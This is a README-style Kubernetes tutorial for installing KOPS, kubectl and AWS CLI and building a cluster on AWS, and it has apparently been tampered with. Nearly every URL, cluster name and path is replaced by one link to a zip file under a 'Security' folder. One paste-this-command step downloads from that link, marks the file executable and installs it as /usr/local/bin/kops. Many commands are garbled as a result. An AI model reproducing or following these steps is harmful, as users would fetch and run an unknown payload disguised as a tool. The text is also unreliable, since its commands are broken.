# Kubernetes-Zero-to-Hero
Creating this repo with an intent to make Kubernetes easy for begineers. This is a work-in-progress repo.

## Kubernetes Installation Using KOPS on EC2

### Create an EC2 instance or use your personal laptop.

Dependencies required 

1. Python3
2. AWS CLI
3. kubectl

###  Install dependencies


Add the new Kubernetes repository:
```
sudo apt-get update
sudo apt-get install -y ca-certificates curl apt-transport-https

```

```
curl -fsSL https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip | sudo gpg --dearmor -o https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip

```

```
echo 'deb [https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip] https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip /' | sudo tee https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
```

```
sudo apt-get update
sudo apt-get install -y kubectl

```

Install AWS CLI (Ubuntu 24.04 compatible):

```
sudo snap install aws-cli --classic
```
```
export PATH="$https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip"
```

### Install KOPS (our hero for today)

```
curl -LO https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip$(curl -s https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip | grep tag_name | cut -d '"' -f 4)/kops-linux-amd64

chmod +x kops-linux-amd64

sudo mv kops-linux-amd64 /usr/local/bin/kops
```

### Provide the below permissions to your IAM user. If you are using the admin user, the below permissions are available by default

1. AmazonEC2FullAccess
2. AmazonS3FullAccess
3. IAMFullAccess
4. AmazonVPCFullAccess

### Set up AWS CLI configuration on your EC2 Instance or Laptop.

Run `aws configure`

## Kubernetes Cluster Installation 

Please follow the steps carefully and read each command before executing.

### Create S3 bucket for storing the KOPS objects.

```
aws s3api create-bucket --bucket kops-abhi-storage --region us-east-1
```

### Create the cluster 

```
kops create cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip --state=s3://kops-abhi-storage --zones=us-east-1a --node-count=1 https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip  --master-volume-size=8 --node-volume-size=8
```

### Important: Edit the configuration as there are multiple resources created which won't fall into the free tier.

```
kops edit cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
```

Step 12: Build the cluster

```
kops update cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip --yes --state=s3://kops-abhi-storage
```

This will take a few minutes to create............

After a few mins, run the below command to verify the cluster installation.

```
kops validate cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
```

